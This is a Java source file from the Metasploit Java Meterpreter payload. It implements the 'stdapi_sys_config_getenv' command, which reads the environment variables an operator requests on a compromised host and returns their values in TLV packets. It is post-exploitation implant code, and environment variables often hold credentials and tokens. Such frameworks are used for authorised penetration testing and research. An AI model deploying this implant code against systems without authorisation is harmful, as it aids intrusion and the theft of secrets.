package com.metasploit.meterpreter.stdapi;

import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.TLVType;
import com.metasploit.meterpreter.command.Command;
import java.util.List;

public class stdapi_sys_config_getenv implements Command {
	public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
		List envVars = request.getValues(TLVType.TLV_TYPE_ENV_VARIABLE);

		for (int i = 0; i < envVars.size(); ++i) {
			String envVar = (String)envVars.get(i);

			char c = envVar.charAt(0);
			if (c == '$' || c == '%') {
				envVar = envVar.substring(1);
			}
			c = envVar.charAt(envVar.length() - 1);
			if (c == '$' || c == '%') {
				envVar = envVar.substring(0, envVar.length() - 1);
			}

			String envVal = System.getenv(envVar);
			TLVPacket grp = new TLVPacket();

			grp.add(TLVType.TLV_TYPE_ENV_VARIABLE, envVar);
			grp.add(TLVType.TLV_TYPE_ENV_VALUE, envVal);

			response.addOverflow(TLVType.TLV_TYPE_ENV_GROUP, grp);
		}

		return ERROR_SUCCESS;
	}
}
